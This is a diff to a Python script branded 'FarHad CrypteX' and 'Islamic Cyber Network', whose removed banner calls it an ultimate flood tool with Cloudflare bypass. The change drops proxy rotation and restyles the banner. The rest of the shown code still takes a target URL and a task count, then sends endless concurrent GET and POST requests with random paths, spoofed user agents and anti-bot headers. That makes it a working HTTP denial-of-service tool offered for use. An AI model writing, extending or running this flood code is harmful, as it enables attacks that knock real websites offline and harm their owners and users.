@@ -11,33 +11,16 @@ import os
 os.system('clear')
 
 print(Fore.CYAN + '''
-< Islamic Cyber Network >
-      !!!!!!!
-     ^~~!!!~~^
-    ^$$$nWxl!         <!!IUW$$$^
-   $$$$$#MWX!        $$$$$$$$$$
- ^$$$$$b  $$$UX      $$$$$$$$$$
- ^$$$b    $$$$^      d$$R   d$$R
-   *$bd$$$*          $$$$so~#
-
-███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗     
-██╔════╝██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗    
-█████╗  ███████║██████╔╝█████╔╝ ███████║██║  ██║    
-██╔══╝  ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║██║  ██║    
-██║     ██║  ██║██║     ██║  ██╗██║  ██║██████╔╝    
-╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     
-
-   FarHad–CrypteX  |  Cloudflare Bypass Edition
+╔═════════════════════════════════════════════╗
+║      FarHad CrypteX - Cloud Bypass Tool    ║
+║         Powered by Islamic Cyber Network   ║
+╚═════════════════════════════════════════════╝
 ''')
 
-print(Fore.YELLOW + "FARHAD CRYPTEX - ULTIMATE FLOOD TOOL v4.0 (Cloudflare Bypass)\n")
+print(Fore.YELLOW + "Version: 4.0 | Author: FarHad CrypteX\n")
 
 url = input("Enter target URL (without trailing /): ")
 threads = int(input("Enter number of concurrent tasks: "))
-proxy_file = input("Enter proxy list file (one per line, e.g., 123.123.123.123:8080): ")
-
-with open(proxy_file, 'r') as f:
-    proxies = [line.strip() for line in f.readlines() if line.strip()]
 
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -62,7 +45,7 @@ def random_string(length=8):
 def random_path():
     return '/' + '/'.join(random_string(5) for _ in range(2))
 
-async def attack(session, proxy):
+async def attack(session):
     global success, failed
     method = random.choice(['GET', 'POST'])
     base_headers = {
@@ -71,7 +54,6 @@ async def attack(session, proxy):
         'Accept-Encoding': 'gzip, deflate, br',
         'Accept-Language': 'en-US,en;q=0.9'
     }
-    # Add custom anti-bot headers
     for h in custom_headers:
         for key, func in h.items():
             base_headers[key] = func()
@@ -82,16 +64,16 @@ async def attack(session, proxy):
 
     try:
         if method == 'GET':
-            async with session.get(full_url, headers=base_headers, params=params, proxy=f'http://{proxy}', timeout=5, ssl=False) as resp:
+            async with session.get(full_url, headers=base_headers, params=params, timeout=5, ssl=False) as resp:
                 success += 1
-                print(Fore.GREEN + f"[+] {proxy} | {method} {full_url} | Code: {resp.status}")
+                print(Fore.GREEN + f"[+] {method} {full_url} | Code: {resp.status}")
         else:
-            async with session.post(full_url, headers=base_headers, data=data, proxy=f'http://{proxy}', timeout=5, ssl=False) as resp:
+            async with session.post(full_url, headers=base_headers, data=data, timeout=5, ssl=False) as resp:
                 success += 1
-                print(Fore.GREEN + f"[+] {proxy} | {method} {full_url} | Code: {resp.status}")
+                print(Fore.GREEN + f"[+] {method} {full_url} | Code: {resp.status}")
     except Exception as e:
         failed += 1
-        print(Fore.RED + f"[-] {proxy} | {method} {full_url} | Failed ({str(e)[:30]})")
+        print(Fore.RED + f"[-] {method} {full_url} | Failed ({str(e)[:30]})")
 
 async def stats():
     while True:
@@ -106,8 +88,7 @@ async def main():
         while True:
             tasks = []
             for _ in range(threads):
-                proxy = random.choice(proxies)
-                tasks.append(attack(session, proxy))
+                tasks.append(attack(session))
             await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
